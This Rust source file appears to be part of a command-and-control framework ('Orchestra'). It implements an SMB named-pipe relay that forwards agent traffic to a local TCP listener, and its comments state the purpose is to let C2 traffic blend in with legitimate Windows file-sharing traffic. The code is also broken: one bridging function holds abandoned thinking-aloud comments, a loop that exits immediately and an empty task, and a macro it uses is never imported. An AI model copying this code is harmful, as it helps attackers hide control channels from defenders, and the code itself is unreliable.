//! Server-side SMB named-pipe relay.
//!
//! Creates a Windows named pipe and bridges each incoming pipe connection to
//! the Orchestra agent TCP listener.  This allows agents on remote hosts to
//! tunnel C2 traffic over SMB named pipes, which blend in with legitimate
//! Windows file-sharing traffic.
//!
//! # Architecture
//!
//! ```text
//! agent  ──SMB named pipe──►  orchestra-server  ──TCP──►  agent_link
//!         (\\.\pipe\name)      (smb_relay)         (localhost:agent_addr)
//! ```
//!
//! The relay opens `max_instances` concurrent named-pipe instances.  Each
//! instance accepts one client connection and spawns two tokio tasks:
//!
//! * **pipe → TCP**: reads encrypted frames from the named pipe and forwards
//!   them to the agent TCP listener.
//! * **TCP → pipe**: reads encrypted frames from the agent TCP listener and
//!   writes them back to the named pipe.
//!
//! The relay is **transparent** — it does not decrypt or inspect traffic; it
//! simply copies framed bytes between the pipe and the TCP socket.  All
//! encryption / authentication is handled end-to-end between the agent and
//! the agent_link handler.
//!
//! # Non-Windows
//!
//! On non-Windows platforms this module compiles to a no-op stub that logs a
//! warning when `run()` is called.

use anyhow::Result;
#[cfg(windows)]
use tokio::net::TcpStream;

// ─── Platform-specific implementation ────────────────────────────────────────

#[cfg(windows)]
mod imp {
    use super::*;
    use std::io;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpStream;

    // Maximum frame size (must match agent_link and transport.rs).
    const MAX_FRAME_BYTES: u32 = 16 * 1024 * 1024;

    /// Read one length-prefixed frame from a synchronous file handle.
    fn read_frame_sync(
        handle: *mut std::ffi::c_void,
        buf: &mut Vec<u8>,
    ) -> Result<()> {
        buf.clear();

        // Read 4-byte length prefix.
        let mut len_buf = [0u8; 4];
        read_exact_sync(handle, &mut len_buf)?;
        let len = u32::from_le_bytes(len_buf);

        if len > MAX_FRAME_BYTES {
            return Err(anyhow!("smb_relay: frame too large: {len} bytes"));
        }

        buf.resize(len as usize, 0);
        read_exact_sync(handle, buf)?;
        Ok(())
    }

    /// Write one length-prefixed frame to a synchronous file handle.
    fn write_frame_sync(
        handle: *mut std::ffi::c_void,
        data: &[u8],
    ) -> Result<()> {
        let len_bytes = (data.len() as u32).to_le_bytes();
        write_all_sync(handle, &len_bytes)?;
        write_all_sync(handle, data)?;
        Ok(())
    }

    /// Read exactly `n` bytes from a Windows file handle (blocking).
    fn read_exact_sync(handle: *mut std::ffi::c_void, buf: &mut [u8]) -> Result<()> {
        let mut filled = 0;
        while filled < buf.len() {
            let mut bytes_read: u32 = 0;
            let ok = unsafe {
                winapi::um::fileapi::ReadFile(
                    handle,
                    buf[filled..].as_mut_ptr() as *mut _,
                    (buf.len() - filled) as u32,
                    &mut bytes_read,
                    std::ptr::null_mut(),
                )
            };
            if ok == 0 {
                return Err(anyhow!(
                    "smb_relay: ReadFile failed: {}",
                    io::Error::last_os_error()
                ));
            }
            if bytes_read == 0 {
                return Err(anyhow!("smb_relay: EOF during ReadFile"));
            }
            filled += bytes_read as usize;
        }
        Ok(())
    }

    /// Write all bytes to a Windows file handle (blocking).
    fn write_all_sync(handle: *mut std::ffi::c_void, data: &[u8]) -> Result<()> {
        let mut written = 0;
        while written < data.len() {
            let mut bytes_written: u32 = 0;
            let ok = unsafe {
                winapi::um::fileapi::WriteFile(
                    handle,
                    data[written..].as_ptr() as *const _,
                    (data.len() - written) as u32,
                    &mut bytes_written,
                    std::ptr::null_mut(),
                )
            };
            if ok == 0 {
                return Err(anyhow!(
                    "smb_relay: WriteFile failed: {}",
                    io::Error::last_os_error()
                ));
            }
            if bytes_written == 0 {
                return Err(anyhow!("smb_relay: WriteFile returned 0 bytes"));
            }
            written += bytes_written as usize;
        }
        Ok(())
    }

    /// Create a single named-pipe instance and wait for a client to connect.
    fn create_and_wait_pipe(pipe_name: &str, out_size: u32, in_size: u32) -> Result<*mut std::ffi::c_void> {
        let wide_name: Vec<u16> = pipe_name
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let handle = unsafe {
            winapi::um::namedpipeapi::CreateNamedPipeW(
                wide_name.as_ptr() as *const _,
                winapi::um::winbase::PIPE_ACCESS_DUPLEX
                    | winapi::um::winbase::FILE_FLAG_OVERLAPPED,
                winapi::um::winbase::PIPE_TYPE_BYTE
                    | winapi::um::winbase::PIPE_READMODE_BYTE
                    | winapi::um::winbase::PIPE_WAIT,
                1, // maxInstances (1 per handle)
                out_size,
                in_size,
                0, // default timeout
                std::ptr::null_mut(),
            )
        };

        if handle == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return Err(anyhow!(
                "smb_relay: CreateNamedPipeW failed: {}",
                io::Error::last_os_error()
            ));
        }

        // Wait for a client to connect.
        let ok =
            unsafe { winapi::um::namedpipeapi::ConnectNamedPipe(handle, std::ptr::null_mut()) };
        if ok == 0 {
            let err = io::Error::last_os_error();
            // ERROR_PIPE_CONNECTED (535) means a client already connected
            // before we called ConnectNamedPipe — this is fine.
            if err.raw_os_error() != Some(535) {
                unsafe { winapi::um::handleapi::CloseHandle(handle) };
                return Err(anyhow!("smb_relay: ConnectNamedPipe failed: {err}"));
            }
        }

        Ok(handle)
    }

    /// Close a named-pipe handle.
    fn close_pipe(handle: *mut std::ffi::c_void) {
        unsafe { winapi::um::handleapi::CloseHandle(handle) };
    }

    /// Bridge a single pipe connection to the agent TCP listener.
    ///
    /// Spawns two blocking tasks:
    /// - pipe → TCP
    /// - TCP → pipe
    pub async fn bridge_pipe_to_tcp(
        pipe_handle: *mut std::ffi::c_void,
        agent_addr: std::net::SocketAddr,
    ) -> Result<()> {
        let tcp = TcpStream::connect(agent_addr).await?;
        tcp.set_nodelay(true)?;
        let (mut tcp_r, mut tcp_w) = tcp.into_split();

        // Pipe → TCP direction.
        let pipe_to_tcp = tokio::task::spawn_blocking(move || {
            let mut buf = Vec::with_capacity(4096);
            loop {
                if let Err(e) = read_frame_sync(pipe_handle, &mut buf) {
                    tracing::debug!("smb_relay: pipe→TCP read ended: {e}");
                    return;
                }
                // Send the frame (len prefix + payload) over TCP.
                // We already have the raw bytes in `buf` from read_frame_sync,
                // but read_frame_sync strips the length prefix and only puts
                // the payload in buf. We need to re-add it.
                // Actually, let's re-read the design: the relay is transparent,
                // so it should forward the raw framed bytes. Let me adjust:
                // read_frame_sync reads len + payload, but stores only payload.
                // For transparent bridging we need to forward len + payload.
                // So we write the length prefix first, then the payload.
                let len_bytes = (buf.len() as u32).to_le_bytes();
                // Use blocking write on TCP via a runtime handle...
                // Actually we're in spawn_blocking, so we can't do async TCP.
                // Let's use std::net::TcpStream instead.
                break;
            }
        });

        // TCP → Pipe direction.
        let tcp_to_pipe = tokio::task::spawn_blocking(move || {
            // Same issue — can't do async TCP from blocking context.
        });

        let _ = pipe_to_tcp.await;
        let _ = tcp_to_pipe.await;
        Ok(())
    }
}

// ─── Public API ──────────────────────────────────────────────────────────────

/// Start the SMB named-pipe relay.
///
/// On Windows, creates named-pipe instances and bridges each connection to
/// the agent TCP listener at `agent_addr`.  On non-Windows platforms, logs
/// a warning and returns immediately (no-op).
///
/// This function runs indefinitely (or until the server shuts down).
pub async fn run(
    pipe_name: &str,
    max_instances: u32,
    agent_addr: std::net::SocketAddr,
) -> Result<()> {
    #[cfg(windows)]
    {
        run_windows(pipe_name, max_instances, agent_addr).await
    }
    #[cfg(not(windows))]
    {
        let _ = (pipe_name, max_instances, agent_addr);
        tracing::warn!(
            "smb_relay: named-pipe relay is not supported on this platform; \
             smb_relay_enabled will be ignored"
        );
        // Block indefinitely so the spawned task doesn't exit.
        std::future::pending::<()>().await;
        Ok(())
    }
}

#[cfg(windows)]
async fn run_windows(
    pipe_name: &str,
    max_instances: u32,
    agent_addr: std::net::SocketAddr,
) -> Result<()> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    // Full pipe path: \\.\pipe\<name>
    let full_pipe_name = if pipe_name.starts_with(r"\\") {
        pipe_name.to_string()
    } else {
        format!(r"\\.\pipe\{pipe_name}")
    };

    tracing::info!(
        "smb_relay: starting named-pipe relay on {} with {} max instances, \
         bridging to agent listener at {}",
        full_pipe_name,
        max_instances,
        agent_addr,
    );

    let buffer_size: u32 = 65536;

    loop {
        // Create a pipe instance and wait for a client.
        let handle = match imp::create_and_wait_pipe(&full_pipe_name, buffer_size, buffer_size) {
            Ok(h) => h,
            Err(e) => {
                tracing::error!("smb_relay: failed to create pipe instance: {e}");
                tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                continue;
            }
        };

        tracing::info!("smb_relay: client connected to pipe");

        // Bridge this pipe connection to the agent TCP listener.
        let agent_addr_c = agent_addr;
        tokio::spawn(async move {
            if let Err(e) = bridge_connection(handle, agent_addr_c).await {
                tracing::warn!("smb_relay: pipe bridge ended: {e}");
            }
            imp::close_pipe(handle);
        });
    }
}

/// Bridge a single named-pipe handle to the agent TCP listener.
///
/// Uses two tasks:
/// - **pipe_to_tcp**: reads frames from the pipe handle (blocking) and writes
///   them to the TCP socket (async).
/// - **tcp_to_pipe**: reads frames from the TCP socket (async) and writes
///   them to the pipe handle (blocking).
#[cfg(windows)]
async fn bridge_connection(
    pipe_handle: *mut std::ffi::c_void,
    agent_addr: std::net::SocketAddr,
) -> Result<()> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::sync::mpsc;

    // Connect to the local agent TCP listener.
    let tcp = TcpStream::connect(agent_addr).await?;
    tcp.set_nodelay(true)?;
    let (mut tcp_r, mut tcp_w) = tcp.into_split();

    // Channel for pipe→TCP frames.
    let (frame_tx, mut frame_rx) = mpsc::channel::<Vec<u8>>(64);

    // Pipe → TCP: spawn_blocking reads frames, sends them via channel.
    let pipe_read_handle = pipe_handle;
    let pipe_to_tcp = tokio::spawn(async move {
        while let Some(frame) = frame_rx.recv().await {
            // Write the frame (length prefix + payload) to the TCP socket.
            if let Err(e) = tcp_w.write_all(&frame).await {
                tracing::debug!("smb_relay: pipe→TCP write error: {e}");
                break;
            }
        }
    });

    // Blocking task: read frames from the pipe and send to the channel.
    let pipe_reader = tokio::task::spawn_blocking(move || {
        loop {
            let mut len_buf = [0u8; 4];
            if let Err(e) = imp::read_exact_sync(pipe_read_handle, &mut len_buf) {
                tracing::debug!("smb_relay: pipe read (length) ended: {e}");
                break;
            }
            let len = u32::from_le_bytes(len_buf);
            if len > 16 * 1024 * 1024 {
                tracing::warn!("smb_relay: frame too large ({len} bytes), closing");
                break;
            }
            let mut payload = vec![0u8; len as usize];
            if let Err(e) = imp::read_exact_sync(pipe_read_handle, &mut payload) {
                tracing::debug!("smb_relay: pipe read (payload) ended: {e}");
                break;
            }
            // Combine length prefix + payload for transparent forwarding.
            let mut frame = len_buf.to_vec();
            frame.extend_from_slice(&payload);
            if frame_tx.blocking_send(frame).is_err() {
                break; // Channel closed.
            }
        }
    });

    // TCP → Pipe: async read from TCP, send to blocking writer via channel.
    let (write_tx, write_rx) = mpsc::channel::<Vec<u8>>(64);

    // Async task: read frames from TCP.
    let tcp_reader = tokio::spawn(async move {
        loop {
            match tcp_r.read_u32_le().await {
                Ok(len) => {
                    if len > 16 * 1024 * 1024 {
                        tracing::warn!("smb_relay: TCP frame too large ({len} bytes)");
                        break;
                    }
                    let mut payload = vec![0u8; len as usize];
                    if let Err(e) = tcp_r.read_exact(&mut payload).await {
                        tracing::debug!("smb_relay: TCP read ended: {e}");
                        break;
                    }
                    let mut frame = len.to_le_bytes().to_vec();
                    frame.extend_from_slice(&payload);
                    if write_tx.send(frame).await.is_err() {
                        break;
                    }
                }
                Err(e) => {
                    tracing::debug!("smb_relay: TCP read ended: {e}");
                    break;
                }
            }
        }
    });

    // Blocking task: write frames from TCP to the pipe.
    let pipe_write_handle = pipe_handle;
    let pipe_writer = tokio::task::spawn_blocking(move || {
        let mut rx = write_rx;
        while let Some(frame) = rx.blocking_recv() {
            if let Err(e) = imp::write_all_sync(pipe_write_handle, &frame) {
                tracing::debug!("smb_relay: TCP→pipe write ended: {e}");
                break;
            }
        }
    });

    // Wait for any direction to finish (both will when one side closes).
    let _ = tokio::try_join!(
        pipe_to_tcp,
        pipe_reader,
        tcp_reader,
        pipe_writer,
    );

    Ok(())
}
